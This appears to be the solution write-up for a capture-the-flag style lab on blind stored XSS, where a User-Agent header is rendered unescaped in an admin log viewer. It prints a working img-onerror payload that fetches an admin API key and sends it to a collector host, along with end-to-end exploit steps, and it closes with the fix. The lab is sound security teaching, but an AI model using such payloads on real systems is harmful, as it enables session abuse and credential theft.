# Solution — Blind XSS via User-Agent in an Admin Log Panel

## Vulnerability class

**CWE-79 / OWASP A03:2021 – Injection** — Improper Neutralization of Input During
Web Page Generation (Cross-Site Scripting), the **blind stored** variant: the
injection point (an HTTP request header) and the execution point (an admin-only
log viewer) are different pages, the attacker and the victim are different users,
and the attacker never sees the payload reflected.

## The sink

`GET /admin/logs` renders the visitor access log with an autoescape-**disabled**
Jinja environment:

```python
_unsafe_env = Environment(autoescape=False)   # the deliberate flaw
LOGS_PAGE = _unsafe_env.from_string("... <td class=\"ua\">{{ ua }}</td> ...")
```

`ua` is each stored `User-Agent` string, interpolated into HTML with no encoding —
`<`, `>`, `"` all pass through. A real app leaves Jinja autoescape **on** (its
default), which would render `<img …>` as inert text.

## The source is an HTTP header

`app.before_request` records `request.headers.get("User-Agent", "")` for every
public request into an in-process ring buffer. Two things make this the whole
lesson:

- **It is a header, not a form field.** Input validation, and the mental model of
  "user input = query/body params", routinely miss headers. `User-Agent` is
  attacker-controlled on every request.
- **It is blind.** `GET /` never echoes the User-Agent back — the response is a
  fixed status page. So you cannot confirm the injection by viewing your own
  response; the payload only executes later, in the admin's browser.

Source (a public `GET /` header) ≠ sink (the admin log page), attacker ≠ victim —
the defining shape of **stored** XSS, here made **blind** by the missing
reflection.

## Blind-XSS methodology — how you find this without reflection

You cannot "view source" to confirm the sink, so you work out-of-band:

1. **Canary payload.** Send a payload that phones home on execution rather than
   one you hope to see reflected — e.g. a User-Agent of
   `<img src=x onerror="new Image().src='http://collector:9000/report?fired=ua'">`.
   If the collector ever logs `fired=ua`, you have proved _something_ rendered
   your header as live HTML, and where (this is exactly how tools like XSS Hunter
   / interactsh work in the wild — you seed many inputs and watch for a callback).
2. **Locate the viewer.** The site advertises a staff panel at `/admin/logs`;
   requesting it yourself returns `403`, telling you a _privileged_ user reaches
   it. That privileged user is who your callback fired as.
3. **Escalate.** Once you know code runs in the admin's session, aim it at
   whatever that session can reach that you cannot.

## Why you can't just read the key

Both admin routes are gated on the admin `session` cookie (constant-time compare):

```
GET /admin/logs     → 403 (you have no admin cookie)
GET /admin/apikey   → 403 (you have no admin cookie)
GET /internal/bot-login?k=…  → 403 from the public side (backend-only + BOT_KEY)
```

You never obtain the cookie. You don't need to — you borrow the admin's browser,
which already has it.

## The payload

```html
<img
  src="x"
  onerror="fetch('/admin/apikey')
    .then(r => r.text())
    .then(t => { new Image().src = 'http://collector:9000/report?k=' + encodeURIComponent(t); })"
/>
```

- `<img src=x onerror=…>` fires the instant the raw-rendered `<img>` fails to load
  its bogus `src` — no `<script>` needed, and it runs purely on page load (the bot
  only navigates and waits; it never clicks).
- `fetch('/admin/apikey')` is **same-origin** with `/admin/logs`, so the admin
  `session` cookie is sent automatically — the fetch returns the 32-hex key that
  a public request is refused.
- `new Image().src = …` fires a cross-origin GET to the in-lab collector with the
  key in the query string (image loads are not subject to the same-origin _read_
  barrier — the request still goes out, which is all we need).

## End-to-end

```
# 1. Store the payload as your User-Agent on a normal request:
GET /
User-Agent: <img src=x onerror="fetch('/admin/apikey').then(r=>r.text()).then(t=>{new Image().src='http://collector:9000/report?k='+encodeURIComponent(t)})">

# 2. Wait ~2s. The admin bot loads /admin/logs, renders your UA unescaped,
#    the onerror fetches /admin/apikey (with its cookie) and beacons the key.

# 3. Read what the collector captured (app-side proxy):
GET /oob/received            # find /report?k=<32 hex>

# 4. Submit the key:
POST /solve   {"c":"<32 hex>"}      →  FLAG{…}
```

`tests/exploit.py` automates this: assert `/admin/logs` and `/admin/apikey` are
`403` for us → plant the UA → poll `/oob/received` → parse the 32-hex key →
`/solve`.

## Why the containment holds

- The collector and admin bot live on a `backend` network with `internal: true` —
  **no route off the host**. The stolen key reaches the in-lab collector but never
  the internet, so the lab ships a real exfiltration primitive at `risk: low`.
- `/internal/bot-login` is firewalled to the backend subnet **and** gated by a
  `BOT_KEY`, so a public visitor cannot mint the admin cookie and skip the XSS.
- `/admin/logs` and `/admin/apikey` require the admin session; the blind-XSS path
  is the _only_ way to reach the key.
- Single gunicorn worker: the access log and admin session live in-process, so the
  bot and the exploit see one consistent buffer.

## The fix

1. **Contextual output encoding — the real fix.** Leave Jinja autoescape on (the
   default), or HTML-encode the User-Agent before insertion:

   ```django
   <td class="ua">{{ ua }}</td>   <!-- autoescape ON: <img …> becomes &lt;img …&gt; -->
   ```

   `<img>` becomes inert text and the payload never runs. Never render an
   attacker-controlled string — **including HTTP headers like `User-Agent`,
   `Referer`, `X-Forwarded-For`** — as raw HTML. If you truly need rich markup,
   run it through an allow-list sanitiser (`nh3`/`bleach`) first.

2. **Note what does _not_ fix it here.** Marking the session cookie `HttpOnly`
   would **not** have stopped this exploit — the secret is read with
   `fetch('/admin/apikey')`, not `document.cookie`. That is the point of this lab
   over the earlier cookie-theft ones: once script runs in the victim's origin, it
   can drive _any_ same-origin authenticated request, so `HttpOnly` is not a
   substitute for output encoding. A strict `Content-Security-Policy` (no inline
   event handlers, restricted `connect-src`/`img-src`) would independently have
   blocked the inline `onerror` and the beacon — defence in depth on top of the
   encoding fix.

## Deviation from the catalog stack

The reference scenario for this pattern is a **FastAPI** access-log service that
writes visitor log lines into **Redis** and renders them in a Jinja log viewer.
This lab **re-platforms it to Flask with an in-process log buffer** (per the
project's Flask-default Hybrid policy). The taught vulnerability — a stored,
blind XSS whose _source is an HTTP header_ and whose _sink is an autoescape-off
render_, chained to an authenticated internal API read — is identical on either
stack; FastAPI and Redis are incidental plumbing (an in-memory `deque` stands in
for the Redis list, and a single gunicorn worker keeps that state consistent).
No behavioural aspect of the lesson depends on the dropped components.
